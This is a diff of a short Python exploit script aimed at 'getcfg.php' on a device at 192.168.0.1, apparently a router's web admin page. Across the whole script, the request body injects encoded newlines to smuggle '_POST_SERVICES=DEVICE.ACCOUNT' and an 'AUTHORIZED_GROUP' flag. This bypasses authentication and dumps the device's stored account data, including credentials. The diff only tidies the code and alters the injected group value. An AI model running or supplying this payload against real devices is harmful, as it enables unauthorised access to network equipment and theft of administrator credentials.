@@ -1,18 +1,14 @@
 import requests as rq
 
-EQ = "%3d"
 IP = "192.168.0.1"
 PORT = "80"
 
-def pair(key, value):
-    return "%0a_POST_" + key + EQ + value
-
-headers_multipart = {
+headers = {
     'CONTENT-TYPE' : 'application/x-www-form-urlencoded'
 }
 
-url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP, port=PORT)
-auth = "%0aAUTHORIZED_GROUP%3d1"
-data = "A=A" + pair("SERVICES", "DEVICE.ACCOUNT") + auth
+url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP,port=PORT)
+data = "Z=Z%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d0"
 
-print(rq.get(url, data=data, headers=headers_multipart).text)
+#print(data)
+print(rq.get(url, data=data, headers=headers).text)
